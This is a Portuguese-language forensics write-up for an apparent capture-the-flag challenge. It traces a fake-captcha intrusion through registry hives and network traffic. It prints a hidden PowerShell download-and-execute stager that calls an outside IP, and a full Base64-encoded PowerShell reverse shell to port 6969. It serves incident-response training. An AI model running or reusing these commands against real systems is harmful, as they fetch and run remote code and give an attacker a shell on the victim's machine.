#Difficult  : Easy
#Tools : Registry Explorer, PowerShell, WireShark
***
#### Info
![[Pasted image 20250321182739.png]]
Recebemos um arquivo de tráfego de rede, e uma pasta com artefatos de end-point para realizar nossas investigações. Esses artefatos de end-point incluem `registry hives`, que acredito que serão muito importante.

***
#### 1 - It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

Primeiro iniciamos o Registry Explorer e importamos o arquivo `2024-09-23T052209_alert_mssp_action\C\Users\happy.grunwald\NTUSER.DAT`.

Após aparecer essa mensagem, confirmamos e selecionamos o logs do DAT.
![[Pasted image 20250321184541.png]]

Esses : 
![[Pasted image 20250321184700.png]]

Após isso ele irá perguntar onde vamos salvar o ``hive`` atualizado. Pode salvar onde preferir. 
![[Pasted image 20250321185023.png]]
Após isso ele irá perguntar se você quer carregar o `hive` atualizado, apenas confirme.

Quando se trata de comandos a serem executados, eles costumam ser armazenados nas chaves `Run`, `RunMRU` e `RunOnce`. Então podemos ir em ``Available bookmarks`` e seleciona-las para conferir.
![[Pasted image 20250321185506.png]]

**Answer** :  ``powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"``
***
#### 2 - At what time in UTC did the malicious payload execute?

Podemos olhar na mesma aba, apenas mudamos de `Values` para `RumMRU`.
![[Pasted image 20250321185701.png]]

**Answer** : ``2024-09-23 05:07:45``
***
#### 3 - The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?

Analisando o comando PowerShell executado, sabemos que baixou um arquivo `office2024install.ps1`, podemos abrir o tráfego de rede e tentar exportar esse arquivo em `File > Export Objects > HTTP...`, salve onde preferir.
![[Pasted image 20250321190052.png]]

Agora podemos usar o PowerShell para obter o sha256 do arquivo.
```
Get-FileHash -Algorithm SHA256 -Path .\office2024install.ps1
```
![[Pasted image 20250321190353.png]]

**Answer** : ``579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE``
***
#### 4 - To which port did the reverse shell connect?

Precisamos primeiro ver o conteúdo do script.
```
cat .\office2024install.ps1
```
![[Pasted image 20250321190600.png]]
Está encodado em Base64.

Devemos então usar um comando de decode, e jogar em algum arquivo para a análise.
```
[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=')) > decode_command.txt
```

```cat 
cat .\decode_command.txt
```
![[Pasted image 20250321190834.png]]
Podemos então notar que a porta utilizada foi a `6969`

**Answer** : `6969`
***
#### 5 - For how many seconds was the reverse shell connection established between C2 and the victim's workstation?

Como já sabemos a porta, podemos filtrar no Wireshark, para ver quando teve o início e o término da comunicação.
```
tcp.port == 6969 and ip.addr == 43.205.115.44
```
![[Pasted image 20250321192715.png]]

De : 
![[Pasted image 20250321192745.png]]
Até :
![[Pasted image 20250321192810.png]]

Primeiro convertemos os dois para segundos, e depois fazemos a subtração.
7 x 60 + 48 = **468** e 14 x 60 + 31 = **871**
871 - 468 = **403**

**Answer** : `403`
***
#### 6 - Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?

Ainda no Wireshark, podemos filtrar pelo IP do atacante e tráfego ``HTTP``.![[Pasted image 20250321193603.png]]

Devemos começar olhando pela primeira resposta como código ``200 OK``. E olharmos seu conteúdo em `Line-based text data: text/html`
![[Pasted image 20250321193806.png]]

Então eu analisei até chegar em uma função ``javascript`` que insere um comando PowerShell na área de transferência.
![[Pasted image 20250321193959.png]]

**Answer** : ``stageClipboard``
***

![[Pasted image 20250321194049.png]]
